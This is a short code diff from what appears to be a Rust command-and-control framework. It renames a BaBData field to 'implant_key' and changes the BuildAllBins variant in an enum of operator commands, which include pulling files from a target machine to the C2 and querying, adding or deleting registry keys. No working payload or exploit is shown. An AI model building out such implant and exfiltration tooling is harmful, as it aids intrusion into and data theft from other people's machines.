@@ -214,7 +214,7 @@ pub enum AdminCommand {
     RmDir(String),
     /// Pulls a file from the target machine, downloading to the C2
     Pull(String),
-    BuildAllBins(BuildAllBins),
+    BuildAllBins(String),
     RegQuery(RegQueryInner),
     RegAdd(RegAddInner),
     RegDelete(RegQueryInner),
@@ -425,11 +425,11 @@ impl ExfiltratedFile {
 
 #[derive(Serialize, Deserialize)]
 pub struct BaBData {
-    pub profile_name: String,
+    pub implant_key: String,
 }
 
 impl BaBData {
-    pub fn from(profile_name: String) -> Self {
-        Self { profile_name }
+    pub fn from(implant_key: String) -> Self {
+        Self { implant_key }
     }
 }
